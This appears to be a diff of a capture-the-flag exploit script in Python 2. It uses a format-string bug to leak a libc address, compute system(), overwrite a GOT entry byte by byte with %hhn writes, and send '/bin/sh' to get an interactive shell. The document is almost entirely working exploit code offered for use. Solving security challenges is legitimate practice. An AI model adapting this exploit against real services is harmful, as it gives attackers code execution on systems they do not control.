@@ -28,37 +28,37 @@ def get_fmt(target, offset):
     byt     = [val3, val2, val1, val0]
     dic     = {val3:3, val2:2, val1:1, val0:0}
     byt.sort()
-    fmt     = ''
+    fmts    = ''
     count   = 0
     for i in xrange(4):
         if i == 0:
-            fmt += "%0{}x%{}$hhn".format(byt[i], dic[byt[i]] + offset)
+            fmts += fmt('w', offset = dic[byt[i]] + offset, target_val = byt[i], width = 1)
         else:
-            fmt += "%0{}x%{}$hhn".format(byt[i] - byt[i-1], dic[byt[i]] + offset)
-    return fmt
+            fmts += fmt('w', offset = dic[byt[i]] + offset, target_val = byt[i] - byt[i-1], width = 1)
+    return fmts
 
 # exp
 def exp():
-    io.hint([0x80486a6])
+    # io.hint([0x80486a6])
     io.ru('First input:')
-    io.pr("%{}$x".format(0x6b))
-
+    io.pr(fmt('r', offset = 0x6b))
     io.ru('Second input:')
-    io.pr("%20$x")
+    io.pr()
 
-    libc___libc_start_main_ret = int(io.ru(',')[:-1], 16)
+    libc___libc_start_main_ret = int(io.ru(',')[2:-1], 16)
     libc_base   = libc___libc_start_main_ret - offset___libc_start_main_ret
     libc_system = libc_base + offset_system
     info_found('__libc_start_main_ret', libc___libc_start_main_ret)
     info_found('libc_base', libc_base)
     info_found('lib_system', libc_system)
-    io.ru('First input:')
 
+    io.ru('First input:')
     io.pr(get_fmt(libc_system, 0x1f).ljust(0x60, '.') + l32(got_print) + l32(got_print + 1) + l32(got_print + 2) + l32(got_print + 3) + ':)')
     io.ru('Second input:')
     io.pr("/bin/sh\x00")
 
     io.ru(':)')
+    info_shell()
     io.interact()
 
 # main
